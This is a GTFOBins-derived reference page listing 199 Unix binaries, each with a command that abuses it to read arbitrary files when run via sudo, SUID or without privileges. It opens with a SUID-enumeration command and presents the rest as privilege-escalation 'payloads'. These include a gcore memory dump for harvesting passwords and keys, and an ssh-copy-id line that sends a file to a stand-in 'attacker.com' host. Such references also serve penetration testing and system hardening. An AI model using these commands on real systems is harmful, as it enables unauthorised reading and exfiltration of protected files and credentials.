---
title: "GTFOBins - file-read (199 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "file-read", "fileread"]
summary: "199 Unix binaries whose file-read function reads an arbitrary file."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `file-read` function reads an arbitrary file, with the exact command. 199 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## file-read payloads

### 7z

*Contexts: sudo, unprivileged*

```bash
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so
```

### alpine

The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.

*Contexts: sudo, suid, unprivileged*

```bash
alpine -F /path/to/input-file
```

### apache2

The first line may be leaked as an error message.

*Contexts: sudo, suid, unprivileged*

```bash
apache2 -f /path/to/input-file
```

The first line may be leaked as an error message.

*Contexts: sudo, suid, unprivileged*

```bash
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
```

### apache2ctl

The first line only is likely leaked as an error message.

*Contexts: sudo, unprivileged*

```bash
apache2ctl -c 'Include /path/to/input-file'
```

### ar

*Contexts: sudo, suid, unprivileged*

```bash
ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file
```

### aria2c

The file is leaked as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
aria2c -i /path/to/input-file
```

### arj

The `.arj` suffix will be added to `output-file`.

*Contexts: sudo, suid, unprivileged*

```bash
arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file
```

### arp

Lines are likely leaked as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
arp -v -f /path/to/input-file
```

### as

Lines are likely leaked as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
as @/path/to/input-file
```

### ascii-xfr

*Contexts: sudo, suid, unprivileged*

```bash
ascii-xfr -ns /path/to/input-file
```

### ascii85

*Contexts: sudo, unprivileged*

```bash
ascii85 /path/to/input-file | ascii85 --decode
```

### aspell

The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.

*Contexts: sudo, suid, unprivileged*

```bash
aspell -c /path/to/input-file
```

The first word is likely displayed as error messaged, and converted to lowercase.

*Contexts: sudo, suid, unprivileged*

```bash
aspell --conf /path/to/input-file
```

### atobm

Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F "'" '{printf "%s", $2}'`.

*Contexts: sudo, suid, unprivileged*

```bash
atobm /path/to/input-file
```

### aws

*Contexts: sudo, suid, unprivileged*

```bash
aws ec2 describe-instances --filter file:///path/to/input-file
```

### base32

*Contexts: sudo, suid, unprivileged*

```bash
base32 /path/to/input-file | base32 --decode
```

### base58

*Contexts: sudo, unprivileged*

```bash
base58 /path/to/input-file | base58 --decode
```

### base64

*Contexts: sudo, suid, unprivileged*

```bash
base64 /path/to/input-file | base64 --decode
```

### basenc

*Contexts: sudo, suid, unprivileged*

```bash
basenc --base64 /path/to/input-file | basenc -d --base64
```

### basez

*Contexts: sudo, suid, unprivileged*

```bash
basez /path/to/input-file | basez --decode
```

### bash

file-read — suid variant

*Contexts: suid*

```bash
bash -p -c 'echo "$(</path/to/input-file)"'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
bash -c 'echo "$(</path/to/input-file)"'
```

This only works interactively from an existing `bash` session.

*Contexts: sudo, suid, unprivileged*

```bash
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r /path/to/input-file
history
```

### bbot

The file is displayed in the debug log.

*Contexts: sudo, unprivileged*

```bash
bbot -d -cy /path/to/input-file
```

### bc

The file content is actually parsed and appears as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
bc -s /path/to/input-file
quit
```

### bconsole

The file is actually parsed and the first wrong line is returned in an error message.

*Contexts: sudo, suid, unprivileged*

```bash
bconsole -c /path/to/file-input
```

### bridge

Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.

*Contexts: sudo, suid, unprivileged*

```bash
bridge -b /path/to/input-file
```

### bzip2

*Contexts: sudo, suid, unprivileged*

```bash
bzip2 -c /path/to/input-file | bzip2 -d
```

### cat

*Contexts: sudo, suid, unprivileged*

```bash
cat /path/to/input-file
```

### check_cups

The read file content is limited to the first line.

*Contexts: sudo, unprivileged*

```bash
check_cups --extra-opts=@/path/to/input-file
```

### check_log

*Contexts: sudo, unprivileged*

```bash
check_log -F /path/to/input-file -O /dev/stdout
```

### check_memory

The read file content is limited to the first line.

*Contexts: sudo, unprivileged*

```bash
check_memory --extra-opts=@/path/to/input-file
```

### check_raid

The read file content is limited to the first line.

*Contexts: sudo, unprivileged*

```bash
check_raid --extra-opts=@/path/to/input-file
```

### check_statusfile

The read file content is limited to the first line.

*Contexts: sudo, unprivileged*

```bash
check_statusfile /path/to/input-file
```

### clamscan

Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.

*Contexts: sudo, suid, unprivileged*

```bash
touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```

### cmake

*Contexts: sudo, unprivileged*

```bash
cmake -E cat /path/to/input-file
```

### cmp

Dump the bytes of the input file that are different from the NUL byte in a tabular format.

*Contexts: sudo, suid, unprivileged*

```bash
cmp /path/to/input-file /dev/zero -b -l
```

### column

This program expects textual data.

*Contexts: sudo, suid, unprivileged*

```bash
column /path/to/input-file
```

### comm

A newline is appended to the file.

*Contexts: sudo, suid, unprivileged*

```bash
comm /path/to/input-file /dev/null
```

### cp

*Contexts: sudo, suid, unprivileged*

```bash
cp /path/to/input-file /dev/stdout
```

### cpio

The content of the file is printed to standard output, between the `cpio` archive format header and footer.

*Contexts: sudo, suid, unprivileged*

```bash
echo /path/to/input-file | cpio -o
```

file-read — sudo variant

*Contexts: sudo*

```bash
echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file
```

file-read — suid variant

*Contexts: suid*

```bash
echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file
```

The whole directory structure is copied to `.`, hence this is also a file write.

*Contexts: sudo (variant below), suid (variant below), unprivileged*

```bash
echo /path/to/input-file | cpio -dp .
cat path/to/input-file
```

### csplit

*Contexts: sudo, suid, unprivileged*

```bash
csplit /path/to/input-file 1
cat xx01
```

### csvtool

The file is actually parsed and manipulated as CSV.

*Contexts: sudo, suid, unprivileged*

```bash
csvtool trim t /path/to/input-file
```

### cupsfilter

*Contexts: sudo, suid, unprivileged*

```bash
cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
```

### curl

*Contexts: sudo, suid, unprivileged*

```bash
curl file:///path/to/input-file
```

### cut

*Contexts: sudo, suid, unprivileged*

```bash
cut -d '' -f1 /path/to/input-file
```

### date

Each line is corrupted by a prefix string and wrapped inside quotes.

*Contexts: sudo, suid, unprivileged*

```bash
date -f /path/to/input-file
```

### dd

*Contexts: sudo, suid, unprivileged*

```bash
dd if=/path/to/input-file
```

### dialog

The file is shown in an interactive TUI dialog.

*Contexts: sudo, suid, unprivileged*

```bash
dialog --textbox /path/to/input-file 0 0
```

### diff

*Contexts: sudo, suid, unprivileged*

```bash
diff --line-format=%L /dev/null /path/to/input-file
```

This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.

*Contexts: sudo, suid, unprivileged*

```bash
diff --recursive /path/to/empty-dir /path/to/input-dir/
```

### dig

Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.

*Contexts: sudo, suid, unprivileged*

```bash
dig -f /path/to/input-file
```

### dmesg

*Contexts: sudo, suid, unprivileged*

```bash
dmesg -rF /path/to/input-file
```

### docker

Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.

*Contexts: sudo, suid, unprivileged*

```bash
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```

### dos2unix

*Contexts: sudo, suid, unprivileged*

```bash
dos2unix -f -O /path/to/input-file
```

### dosbox

The file content will be displayed in the DOSBox graphical window.

*Contexts: sudo, suid, unprivileged*

```bash
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```

The file is copied to a readable location.

*Contexts: sudo, suid, unprivileged*

```bash
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT
```

### dotnet

*Contexts: sudo, unprivileged*

```bash
dotnet fsi
System.IO.File.ReadAllText("/path/to/input-file");;
```

### ed

*Contexts: sudo, suid, unprivileged*

```bash
ed /path/to/input-file
,p
q
```

### efax

The content is actually parsed by the command.

*Contexts: sudo, suid*

```bash
efax -d /path/to/input-file
```

### egrep

*Contexts: sudo, suid, unprivileged*

```bash
grep '' /path/to/input-file
```

### elvish

*Contexts: sudo, suid, unprivileged*

```bash
elvish -c 'print (slurp </path/to/input-file)'
```

### emacs

*Contexts: sudo, unprivileged*

```bash
emacs /path/to/input-file
```

### eqn

The content is actually parsed and corrupted by the command.

*Contexts: sudo, suid, unprivileged*

```bash
eqn /path/to/input-file
```

### espeak

The file content appears in the middle of other textual information as phonemes.

*Contexts: sudo, suid, unprivileged*

```bash
espeak -qXf /path/to/input-file
```

### exiftool

If the permissions allow it, files are moved (instead of copied) to the destination.

*Contexts: sudo, unprivileged*

```bash
exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file
```

### expand

The read file content is corrupted by replacing tabs with spaces.

*Contexts: sudo, suid, unprivileged*

```bash
expand /path/to/input-file
```

### expect

The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.

*Contexts: sudo, suid, unprivileged*

```bash
expect /path/to/input-file
```

### fastfetch

The file content is used as the logo while some other information is displayed on its right.

*Contexts: sudo, suid, unprivileged*

```bash
fastfetch --file /path/to/input-file
```

### fgrep

*Contexts: sudo, suid, unprivileged*

```bash
grep '' /path/to/input-file
```

### file

Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.

*Contexts: sudo, suid, unprivileged*

```bash
file -f /path/to/input-file
```

Each line is corrupted by a prefix string and wrapped inside quotes.

If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.

It can also be provided with a directory and will read each file in the directory.

*Contexts: sudo, suid, unprivileged*

```bash
file -m /path/to/input-file
```

### find

This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.

*Contexts: sudo, suid, unprivileged*

```bash
find /path/to/input-file -exec cat {} \;
```

### fmt

*Contexts: sudo, suid, unprivileged*

```bash
fmt -pNON_EXISTING_PREFIX /path/to/input-file
```

This corrupts the output by wrapping very long lines at the given width (`999`).

*Contexts: sudo, suid, unprivileged*

```bash
fmt -999 /path/to/input-file
```

### fold

This corrupts the output by wrapping very long lines at the given width (`999`).

*Contexts: sudo, suid, unprivileged*

```bash
fold -w999 /path/to/input-file
```

### fping

Each line is treated as an hostname and it's leaked as an error message.

*Contexts: sudo, suid, unprivileged*

```bash
fping -f /path/to/input-file
```

### gawk

*Contexts: sudo, suid, unprivileged*

```bash
gawk '//' /path/to/input-file
```

### gcc

*Contexts: sudo, unprivileged*

```bash
gcc -x c -E /path/to/input-file
```

The file is read and parsed as a list of files (one per line), the content is displayed as error messages.

*Contexts: sudo, unprivileged*

```bash
gcc @/path/to/input-file
```

### gcore

It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.

*Contexts: sudo, suid, unprivileged*

```bash
gcore $PID
```

### genisoimage

The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.

*Contexts: sudo, suid, unprivileged*

```bash
genisoimage -q -o - /path/to/input-file
```

The file is parsed, and some of its content is disclosed by the error messages.

*Contexts: sudo, suid, unprivileged*

```bash
genisoimage -sort /path/to/input-file
```

### git

The read file content is displayed in `diff` style output format.

*Contexts: sudo, suid, unprivileged*

```bash
git diff /dev/null /path/to/input-file
```

### go

*Contexts: sudo, unprivileged*

```bash
echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go
```

### grep

*Contexts: sudo, suid, unprivileged*

```bash
grep '' /path/to/input-file
```

### gzip

*Contexts: capabilities, sudo, suid, unprivileged*

```bash
gzip -c /path/to/input-file | gzip -d
```

### head

*Contexts: sudo, suid, unprivileged*

```bash
head -c-0 /path/to/input-file
```

### hexdump

The output is actually an hex dump.

*Contexts: sudo, suid, unprivileged*

```bash
hd /path/to/input-file
```

### highlight

*Contexts: sudo, suid, unprivileged*

```bash
highlight --no-doc --failsafe /path/to/input-file
```

### iconv

*Contexts: sudo, suid, unprivileged*

```bash
iconv -f 8859_1 -t 8859_1 /path/to/input-file
```

### ip

The read file content is corrupted by error prints.

*Contexts: sudo, suid, unprivileged*

```bash
ip -force -batch /path/to/input-file
```

### jjs

*Contexts: sudo, unprivileged*

```bash
jjs
var BufferedReader = Java.type('java.io.BufferedReader');
var FileReader = Java.type('java.io.FileReader');
var br = new BufferedReader(new FileReader('/path/to/input-file'));
while ((line = br.readLine()) != null) { print(line); }
```

### join

*Contexts: sudo, suid, unprivileged*

```bash
join -a 2 /dev/null /path/to/input-file
```

### jq

*Contexts: sudo, suid, unprivileged*

```bash
jq -Rr . /path/to/input-file
```

### jrunscript

*Contexts: sudo, unprivileged*

```bash
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
    while ((line = br.readLine()) != null) { print(line); }'
```

### jshell

The content is leaked as error messages.

*Contexts: sudo, unprivileged*

```bash
jshell
jshell> /open /path/to/input-file
```

### julia

*Contexts: sudo, suid, unprivileged*

```bash
julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
```

### ksshell

Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.

*Contexts: sudo, suid, unprivileged*

```bash
ksshell -i /path/to/input-file
```

### last

The output might be corrupted or incomplete if the file does not follow the expected database format.

*Contexts: sudo, suid, unprivileged*

```bash
last -a -f /path/to/input-file
```

### latex

The read file will be part of the PDF output.

*Contexts: sudo, suid, unprivileged*

```bash
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```

### latexmk

The read file will be part of the output.

*Contexts: sudo, unprivileged*

```bash
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi
```

### less

*Contexts: sudo, suid, unprivileged*

```bash
less /path/to/input-file
```

This can be used to read another file, e.g., when invoked as a pager with some fixed content.

*Contexts: sudo, suid, unprivileged*

```bash
less /etc/hosts
:e /path/to/input-file
```

This can be used to read another file.

*Contexts: sudo, unprivileged*

```bash
LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
```

### links

The result is displayed in a TUI interface.

*Contexts: sudo, suid, unprivileged*

```bash
links /path/to/input-file
```

### logrotate

The first word is returned in a error message.

*Contexts: sudo, suid, unprivileged*

```bash
logrotate /path/to/input-file
```

### look

*Contexts: sudo, suid, unprivileged*

```bash
look '' /path/to/input-file
```

### ltrace

The file is parsed as a configuration file and its content is shown as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
ltrace -F /path/to/input-file /dev/null
```

### lua

*Contexts: sudo, suid, unprivileged*

```bash
lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
```

### lwp-download

*Contexts: sudo, unprivileged*

```bash
lwp-download file:///path/to/input-file /dev/stdout
```

### lwp-request

*Contexts: sudo, unprivileged*

```bash
lwp-request file:///path/to/input-file
```

### m4

*Contexts: sudo, suid, unprivileged*

```bash
m4 /path/to/input-file
```

### make

*Contexts: sudo, suid, unprivileged*

```bash
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```

### man

The file is shown somehow formatted and displayed in the default pager.

*Contexts: sudo, suid, unprivileged*

```bash
man /path/to/input-file
```

### mawk

*Contexts: sudo, suid, unprivileged*

```bash
mawk '//' /path/to/input-file
```

### more

The file is displayed in the terminal interface.

*Contexts: sudo, suid, unprivileged*

```bash
more /path/to/input-file
```

### mosquitto

The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.

*Contexts: sudo, suid, unprivileged*

```bash
mosquitto -c /path/to/input-file
```

### msgattrib

The file is parsed and displayed as a Java `.properties` file.

*Contexts: sudo, suid, unprivileged*

```bash
msgattrib -P /path/to/input-file
```

### msgcat

The file is parsed and displayed as a Java `.properties` file.

*Contexts: sudo, suid, unprivileged*

```bash
msgcat -P /path/to/input-file
```

### msgconv

The file is parsed and displayed as a Java `.properties` file.

*Contexts: sudo, suid, unprivileged*

```bash
msgconv -P /path/to/input-file
```

### msgfilter

The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.

*Contexts: sudo, suid, unprivileged*

```bash
msgfilter -P -i /path/to/input-file /bin/cat
```

### msgmerge

The file is parsed and displayed as a Java `.properties` file.

*Contexts: sudo, suid, unprivileged*

```bash
msgmerge -P /path/to/input-file /dev/null
```

### msguniq

The file is parsed and displayed as a Java `.properties` file.

*Contexts: sudo, suid, unprivileged*

```bash
msguniq -P /path/to/input-file
```

### mtr

The file is actually parsed, thus the content is corrupted by error prints.

*Contexts: sudo, unprivileged*

```bash
mtr --raw -F /path/to/input-file
```

### mutt

The file is leaked as error messages.

*Contexts: sudo, unprivileged*

```bash
mutt -F /path/to/input-file
```

### mypy

Partial content is leaked as error messages.

*Contexts: sudo, unprivileged*

```bash
mypy /path/to/input-file
```

### nano

The file content is displayed in the terminal interface.

*Contexts: sudo, suid, unprivileged*

```bash
nano /path/to/input-file
```

### nasm

The file content is treated as command line options and disclosed throught error messages.

*Contexts: sudo, suid, unprivileged*

```bash
nasm -@ /path/to/input-file
```

### neofetch

The file content is used as the logo while some other information is displayed on its right.

*Contexts: sudo, unprivileged*

```bash
neofetch --ascii /path/to/input-file
```

### nft

The content is actually parsed and corrupted by the command.

*Contexts: sudo, unprivileged*

```bash
nft -f /path/to/input-file
```

### nl

The read file content is corrupted by a leading space added to each line.

*Contexts: sudo, suid, unprivileged*

```bash
nl -bn -w1 -s '' /path/to/input-file
```

### nm

The file content is treated as command line options and disclosed through error messages.

*Contexts: sudo, suid, unprivileged*

```bash
nm /path/to/input-file
```

### nmap

The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.

*Contexts: sudo, suid, unprivileged*

```bash
nmap -iL /path/to/input-file
```

### node

*Contexts: sudo, suid, unprivileged*

```bash
node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
```

### nroff

The file is typeset and some warning messages may appear.

*Contexts: sudo, unprivileged*

```bash
nroff /path/to/input-file
```

### ntpdate

The file is actually parsed and lines are leaked through error messages.

*Contexts: sudo, suid, unprivileged*

```bash
ntpdate -a x -k /path/to/input-file -d localhost
```

### octave

*Contexts: sudo, suid, unprivileged*

```bash
octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```

### od

Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.

*Contexts: sudo, suid, unprivileged*

```bash
od -An -c -w999 /path/to/input-file
```

### openssl

*Contexts: sudo, suid, unprivileged*

```bash
openssl enc -in /path/to/input-file
```

### openvpn

The file is actually parsed and the first partial wrong line is returned in an error message.

*Contexts: sudo, suid, unprivileged*

```bash
openvpn --config /path/to/input-file
```

### pandoc

*Contexts: sudo, suid, unprivileged*

```bash
pandoc -t plain /path/to/input-file
```

### paste

*Contexts: sudo, suid, unprivileged*

```bash
paste /path/to/input-file
```

### pax

*Contexts: sudo, suid, unprivileged*

```bash
pax -w /path/to/input-file | tar -xO
```

### pdflatex

The read file will be part of the PDF output.

*Contexts: sudo, suid, unprivileged*

```bash
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```

### perl

*Contexts: sudo, suid, unprivileged*

```bash
perl -ne print /path/to/input-file
```

### pg

*Contexts: sudo, suid, unprivileged*

```bash
pg /path/to/input-file
```

### php

*Contexts: sudo, suid, unprivileged*

```bash
php -r 'readfile("/path/to/input-file");'
```

### pic

The output is prefixed with some content.

*Contexts: sudo, suid, unprivileged*

```bash
pic /path/to/input-file
```

### pr

*Contexts: sudo, suid, unprivileged*

```bash
pr -T /path/to/input-file
```

### ptx

*Contexts: sudo, suid, unprivileged*

```bash
ptx -w 999 /path/to/input-file
```

### puppet

The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.

*Contexts: sudo, unprivileged*

```bash
puppet filebucket -l diff /dev/null /path/to/input-file
```

### pygmentize

*Contexts: sudo, unprivileged*

```bash
pygmentize -l text /path/to/input-file
```

### pyright

Content is leaked as error messages.

*Contexts: sudo, unprivileged*

```bash
pyright /path/to/input-file
```

Content is leaked as error messages in JSON format.

*Contexts: sudo, unprivileged*

```bash
pyright --outputjson /path/to/input-file
```

Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.

*Contexts: sudo, unprivileged*

```bash
pyright -w /path/to/input-dir/
```

### python

*Contexts: sudo, suid, unprivileged*

```bash
python -c 'print(open("/path/to/input-file").read())'
```

### qpdf

*Contexts: sudo, suid, unprivileged*

```bash
qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file
```

### rake

The file is actually parsed and the first wrong line is returned in an error message.

*Contexts: sudo, unprivileged*

```bash
rake -f /path/to/input-file
```

### readelf

Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.

*Contexts: sudo, suid, unprivileged*

```bash
readelf -a @/path/to/input-file
```

### redcarpet

The file is actually parsed as a Markdown file.

*Contexts: sudo, unprivileged*

```bash
redcarpet /path/to/input-file
```

### rev

*Contexts: sudo, suid, unprivileged*

```bash
rev /path/to/input-file | rev
```

### ruby

*Contexts: sudo, unprivileged*

```bash
ruby -e 'puts File.read("/path/to/input-file")'
```

### rustc

The compiler leaks some file lines in the compiler error.

*Contexts: sudo, unprivileged*

```bash
rustc /path/to/input-file
```

### rustdoc

Partial content is displayed as error messages.

*Contexts: sudo, unprivileged*

```bash
rustdoc /path/to/input-file
```

### rustfmt

Partial content is displayed as error messages.

*Contexts: sudo, unprivileged*

```bash
rustfmt /path/to/input-file
```

### sed

*Contexts: sudo, suid, unprivileged*

```bash
sed '' /path/to/input-file
```

### shuf

The read file content is corrupted by randomizing the order of NUL terminated strings.

*Contexts: sudo, suid, unprivileged*

```bash
shuf -z /path/to/input-file
```

### socat

*Contexts: sudo, suid, unprivileged*

```bash
socat -u file:/path/to/input-file -
```

### soelim

The content is actually parsed and corrupted by the command.

*Contexts: sudo, suid, unprivileged*

```bash
soelim /path/to/input-file
```

### sort

*Contexts: sudo, suid, unprivileged*

```bash
sort -m /path/to/input-file
```

### split

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

*Contexts: sudo, suid, unprivileged*

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix
```

### sqlite3

*Contexts: sudo, suid, unprivileged*

```bash
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```

### ss

The file content is actually parsed so only a part of the first line is returned as a part of an error message.

*Contexts: sudo, suid, unprivileged*

```bash
ss -a -F /path/to/input-file
```

### ssh

The read file content is corrupted by error prints.

*Contexts: sudo, suid, unprivileged*

```bash
ssh -F /path/to/input-file x
```

### ssh-copy-id

The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.

*Contexts: sudo, unprivileged*

```bash
ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
```

### ssh-keyscan

The file content is actually parsed so only a part of each line is returned as a part of an error message.

*Contexts: sudo, suid, unprivileged*

```bash
ssh-keyscan -f /path/to/input-file
```

### strings

This only returns ASCII strings.

*Contexts: sudo, suid, unprivileged*

```bash
strings /path/to/input-file
```

### sysctl

*Contexts: sudo, suid, unprivileged*

```bash
sysctl -n "/../../path/to/input-file"
```

### tac

Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.

*Contexts: sudo, suid, unprivileged*

```bash
tac -s 'RANDOM' /path/to/input-file
```

### tail

*Contexts: sudo, suid, unprivileged*

```bash
tail -c+0 /path/to/input-file
```

### tar

The file is read then passed to the specified command (e.g., `tar xO`) via standard input.

*Contexts: sudo, suid, unprivileged*

```bash
tar cf /dev/stdout /path/to/input-file -I 'tar xO'
```

### tbl

The read file content is corrupted by additional text at the beginning.

*Contexts: sudo, suid, unprivileged*

```bash
tbl /path/to/input-file
```

### terraform

*Contexts: sudo, suid, unprivileged*

```bash
terraform console
file("/path/to/input-file")
```

### tic

This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.

*Contexts: sudo, suid, unprivileged*

```bash
tic -C /path/to/input-file
```

### tmux

The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.

*Contexts: sudo, suid, unprivileged*

```bash
tmux -f /path/to/input-file
```

### troff

The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.

*Contexts: sudo, suid, unprivileged*

```bash
troff /path/to/input-file
```

### tsc

Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

*Contexts: sudo, unprivileged*

```bash
tsc /path/to/input-file.ts
```

### ul

The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.

*Contexts: sudo, suid, unprivileged*

```bash
ul /path/to/input-file
```

### unexpand

Convert sequences of (e.g., `999`) spaces to tab.

*Contexts: sudo, suid, unprivileged*

```bash
unexpand -t999 /path/to/input-file
```

### uniq

The read file content is corrupted by squashing multiple adjacent lines.

*Contexts: sudo, suid, unprivileged*

```bash
uniq /path/to/input-file
```

### urlget

This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.

*Contexts: sudo, suid, unprivileged*

```bash
urlget - /path/to/input-file
```

### uuencode

*Contexts: sudo, suid, unprivileged*

```bash
uuencode /path/to/input-file /dev/stdout | uudecode
```

### vi

*Contexts: sudo, suid, unprivileged*

```bash
vi /path/to/input-file
```

### vim

*Contexts: sudo, suid, unprivileged*

```bash
vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
```

### w3m

*Contexts: sudo, suid, unprivileged*

```bash
w3m -dump /path/to/input-file
```

### wall

The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).

*Contexts: sudo*

```bash
wall --nobanner /path/to/input-file
```

### wc

The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.

*Contexts: sudo, suid, unprivileged*

```bash
wc --files0-from /path/to/input-file
```

### wget

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
wget -i /path/to/input-file
```

### whiptail

The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.

*Contexts: sudo, suid, unprivileged*

```bash
whiptail --textbox --scrolltext /path/to/input-file 0 0
```

### xargs

*Contexts: sudo, suid, unprivileged*

```bash
xargs -a /path/to/input-file -0
```

### xmodmap

The read file content is corrupted by error prints.

*Contexts: sudo, suid, unprivileged*

```bash
xmodmap -v /path/to/input-file
```

### xmore

The file is displayed in a graphical window.

*Contexts: sudo, suid, unprivileged*

```bash
xmore /path/to/input-file
```

### xpad

The file is displayed in a graphical window.

*Contexts: sudo, suid, unprivileged*

```bash
xpad -f /path/to/input-file
```

### xxd

*Contexts: sudo, suid, unprivileged*

```bash
xxd /path/to/input-file | xxd -r
```

### xz

*Contexts: sudo, suid, unprivileged*

```bash
xz -c /path/to/input-file | xz -d
```

### yelp

This spawns a graphical window containing the file content somehow corrupted by word wrapping.

*Contexts: sudo, unprivileged*

```bash
yelp man:/path/to/input-file
```

### zcat

*Contexts: sudo, unprivileged*

```bash
zcat -f /path/to/input-file
```

### zgrep

*Contexts: sudo, unprivileged*

```bash
grep '' /path/to/input-file
```

### zip

*Contexts: sudo, suid, unprivileged*

```bash
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

### zsh

*Contexts: sudo, suid, unprivileged*

```bash
zsh -c 'echo "$(</path/to/input-file)"'
```

This spawns a pager if run in a TTY.

*Contexts: sudo, suid, unprivileged*

```bash
zsh -c '</path/to/input-file'
```

### zsoelim

The content is actually parsed and corrupted by the command.

*Contexts: sudo, suid, unprivileged*

```bash
zsoelim /path/to/input-file
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
